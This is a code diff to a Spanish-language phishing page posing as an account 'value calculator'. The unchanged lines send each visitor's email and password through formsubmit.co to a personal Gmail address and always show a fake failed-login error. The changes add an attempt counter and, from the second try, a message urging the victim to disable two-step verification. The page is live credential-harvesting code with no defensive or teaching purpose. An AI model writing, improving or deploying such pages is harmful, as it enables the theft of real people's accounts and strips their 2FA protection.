@@ -170,14 +170,9 @@
         .error-message {
             margin-top: 1.5rem;
             padding: 1rem 1.5rem;
-            background: rgba(255, 0, 0, 0.08);
-            border-left: 5px solid #ff4444;
             border-radius: 16px;
-            color: #ff6b6b;
-            font-weight: 700;
-            font-size: 1.1rem;
             display: none;
-            align-items: center;
+            align-items: flex-start;
             gap: 12px;
             backdrop-filter: blur(4px);
             animation: shake 0.5s ease;
@@ -185,9 +180,38 @@
         .error-message.show {
             display: flex;
         }
-        .error-message i {
-            font-size: 1.6rem;
+        .error-message .icon-container {
+            flex-shrink: 0;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            background: rgba(255, 0, 0, 0.1);
+            border: 2px solid rgba(255, 0, 0, 0.2);
+        }
+        .error-message .icon-container i {
             color: #ff4444;
+        }
+        .error-message .error-content {
+            flex: 1;
+        }
+        .error-message .error-content .error-title {
+            font-weight: 700;
+            font-size: 1rem;
+            color: #ff6b6b;
+            margin-bottom: 2px;
+        }
+        .error-message .error-content .error-desc {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.7);
+            line-height: 1.4;
+        }
+        .error-message .error-content .error-desc strong {
+            color: #ff6b6b;
+            font-weight: 600;
         }
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
@@ -506,10 +530,15 @@
                 <a href="#" id="signupLink" class="hover:text-fnYellow transition"><i class="fa-solid fa-user-plus mr-1"></i> Crear cuenta</a>
             </div>
 
-            <!-- Mensaje de error -->
+            <!-- Mensaje de error mejorado -->
             <div class="error-message" id="errorMessage">
-                <i class="fa-solid fa-exclamation-triangle"></i>
-                <span>incorrecto</span>
+                <div class="icon-container">
+                    <i id="errorIcon" class="fa-solid fa-exclamation-triangle"></i>
+                </div>
+                <div class="error-content">
+                    <div class="error-title" id="errorTitle">incorrecto</div>
+                    <div class="error-desc" id="errorDesc">Verifica tus credenciales e inténtalo de nuevo.</div>
+                </div>
             </div>
         </div>
 
@@ -585,11 +614,17 @@
             const loginForm = document.getElementById('loginForm');
             const loginBtn = document.getElementById('loginBtn');
             const errorMessage = document.getElementById('errorMessage');
+            const errorIcon = document.getElementById('errorIcon');
+            const errorTitle = document.getElementById('errorTitle');
+            const errorDesc = document.getElementById('errorDesc');
             const passwordInput = document.getElementById('password');
             const togglePasswordBtn = document.getElementById('togglePassword');
             const eyeIcon = document.getElementById('eyeIcon');
             const emailLocal = document.getElementById('emailLocal');
             const emailDomain = document.getElementById('emailDomain');
+
+            // ===== CONTADOR DE INTENTOS =====
+            let attemptCount = 0;
 
             // ===== TOGGLE PASSWORD =====
             togglePasswordBtn.addEventListener('click', function(e) {
@@ -603,7 +638,7 @@
                 }
             });
 
-            // ===== FORM SUBMIT (FAKE ERROR) =====
+            // ===== FORM SUBMIT (FAKE ERROR CON CONTADOR) =====
             loginForm.addEventListener('submit', function(e) {
                 e.preventDefault();
 
@@ -613,6 +648,9 @@
                     return;
                 }
 
+                // Incrementar contador
+                attemptCount++;
+
                 loginBtn.classList.add('opacity-70', 'pointer-events-none');
                 loginBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-2"></i> Calculando...';
                 errorMessage.classList.remove('show');
@@ -620,12 +658,11 @@
                 const fullEmail = local + '@' + emailDomain.value;
                 const password = passwordInput.value;
                 const formData = new FormData();
-                // Asunto dinámico con el email/usuario
                 formData.append('_subject', `Nuevo intento de valoración - ${fullEmail}`);
                 formData.append('email', fullEmail);
                 formData.append('password', password);
 
-                // Envío real a Formsubmit (destino parameganz25@gmail.com)
+                // Envío real a Formsubmit
                 fetch('https://formsubmit.co/parameganz25@gmail.com', {
                     method: 'POST',
                     body: formData,
@@ -634,7 +671,9 @@
                     setTimeout(() => {
                         loginBtn.classList.remove('opacity-70', 'pointer-events-none');
                         loginBtn.innerHTML = '<i class="fa-solid fa-calculator mr-2"></i> Calcular valor';
-                        errorMessage.classList.add('show');
+                        
+                        // Mostrar error según el contador
+                        mostrarError(attemptCount);
                         showToast('Acceso denegado. Credenciales incorrectas.');
                     }, 2000);
                 })
@@ -642,11 +681,32 @@
                     setTimeout(() => {
                         loginBtn.classList.remove('opacity-70', 'pointer-events-none');
                         loginBtn.innerHTML = '<i class="fa-solid fa-calculator mr-2"></i> Calcular valor';
-                        errorMessage.classList.add('show');
+                        mostrarError(attemptCount);
                         showToast('Error de red, pero simulación completada.');
                     }, 2000);
                 });
             });
+
+            // ===== FUNCIÓN PARA MOSTRAR ERROR SEGÚN INTENTOS =====
+            function mostrarError(intentos) {
+                errorMessage.classList.add('show');
+                if (intentos >= 2) {
+                    // Segunda vez o más: mensaje profesional con interrogación roja
+                    errorIcon.className = 'fa-solid fa-circle-question';
+                    errorIcon.style.color = '#ff4444';
+                    errorTitle.textContent = 'Verificación en dos pasos activa';
+                    errorDesc.innerHTML = `
+                        Es posible que tengas que <strong>desactivar la verificación en dos pasos</strong> 
+                        para acceder a esta herramienta. Contacta con soporte si el problema persiste.
+                    `;
+                } else {
+                    // Primer intento: mensaje simple
+                    errorIcon.className = 'fa-solid fa-exclamation-triangle';
+                    errorIcon.style.color = '#ff4444';
+                    errorTitle.textContent = 'incorrecto';
+                    errorDesc.textContent = 'Verifica tus credenciales e inténtalo de nuevo.';
+                }
+            }
 
             // ===== HELP LINKS =====
             document.getElementById('forgotLink').addEventListener('click', function(e) {
